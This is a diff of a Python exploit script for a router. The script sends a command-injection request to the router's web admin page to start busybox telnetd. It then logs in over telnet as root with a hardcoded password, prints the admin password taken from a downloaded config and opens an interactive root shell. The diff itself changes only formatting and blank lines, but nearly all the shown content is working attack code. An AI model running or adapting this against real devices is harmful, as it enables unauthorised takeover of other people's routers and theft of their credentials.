@@ -52,17 +52,13 @@ def run_telnetd(target):
     data = 'submit-url=%2Fsyscmd.htm&sysCmdselect=5&sysCmdselects=0&save_apply=Run+Command&sysCmd=busybox%20telnetd'
     data = data.encode()
     r = request.urlopen(req, data=data)
-    #content = r.read()
-
 
 def telnet_connect(target):
     telnet = telnetlib.Telnet(target)
     telnet.read_until(b"login: ")
     telnet.write("root".encode('ascii') + b"\n")
-
     telnet.read_until(b"Password: ")
     telnet.write("123456".encode('ascii') + b"\n")
-
     telnet.interact()
 
 def cleanup():
@@ -72,15 +68,18 @@ if (len(sys.argv)) != 2:
 	print ("Usage: " + sys.argv[0] + " <target IP>")
 	exit(1)
 
-print ("Setting target to " + sys.argv[1])
+print("Setting target to " + sys.argv[1])
 target = sys.argv[1]
 
-print ("Downloading config")
+print("Downloading config")
 get_config(target)
-print ("Router admin password is: " + get_password())
-print ("Running busybox/telnetd")
+
+print("Router admin password is: " + get_password())
+print("Running busybox/telnetd")
 run_telnetd(target)
-print ("Dropping you into a root shell -- have a nice day")
+
+print("Dropping you into a root shell -- have a nice day")
 telnet_connect(target)
-print ("Cleaning up")
+
+print("Cleaning up")
 cleanup()
